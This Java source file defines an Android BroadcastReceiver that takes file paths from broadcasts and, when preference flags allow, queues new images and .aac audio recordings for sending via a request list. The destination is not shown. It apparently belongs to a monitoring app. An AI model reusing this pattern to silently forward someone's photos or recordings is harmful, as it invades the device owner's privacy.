package com.inet.android.request;

import java.util.concurrent.TimeUnit;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.util.Log;

import com.inet.android.utils.Logging;

/**
 * Class for sending file requests receiving via broadcast.
 * 
 * @author johny homicide
 *
 */
public class FileReceiver extends BroadcastReceiver {
	private final String LOG_TAG = FileReceiver.class.getSimpleName()
			.toString();
	private static final String TYPE = "type";
	private static final int ID_ACTION_SEND = 1;
	private static final int ID_ACTION_NOSEND = 0;

	@Override
	public void onReceive(final Context mContext, Intent intent) {
		int type = intent.getIntExtra(TYPE, ID_ACTION_NOSEND);
		switch (type) {
		case ID_ACTION_SEND:
			Log.d(LOG_TAG, "ID_ACTION_SEND");
			String path = intent.getStringExtra("path");
			SharedPreferences sp = PreferenceManager
					.getDefaultSharedPreferences(mContext);
			String image = sp.getString("image_state", "0");
			String audio = sp.getString("audio_state", "0");
			Log.d(LOG_TAG, "path = " + path + " audio: " + audio + " image: "
					+ image);

			int typeValue = -1;
			if (path.endsWith(".jpg") || path.endsWith(".png")
					|| path.endsWith(".gif") || path.endsWith(".bpm")) {
				if (!RequestList.getLastFile().equals(path)
						&& image.equals("1")) {
					RequestList.setLastFile(path);
					try {
						// TimeUnit.SECONDS.sleep(1);
						TimeUnit.MILLISECONDS.sleep(1000);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				} else
					return;
				typeValue = ConstantRequest.TYPE_IMAGE_REQUEST;
				Logging.doLog(LOG_TAG, "data[image]", "data[image]");
			}
			if (path.endsWith(".aac") && audio.equals("1")) {
				Logging.doLog(LOG_TAG, "ath.endsWith(.aac) && audio.equals(1)",
						"ath.endsWith(.aac) && audio.equals(1)");
				Logging.doLog(LOG_TAG, "data[audio]", "data[audio]");

				if (RequestList.getLastFile().equals(path))
					typeValue = ConstantRequest.TYPE_AUDIO_REQUEST;
				else
					RequestList.setLastFile(path);

			}
			if (typeValue == -1)
				return;

			RequestList.sendFileRequest(typeValue, path, mContext);
			break;
		}
	}

}
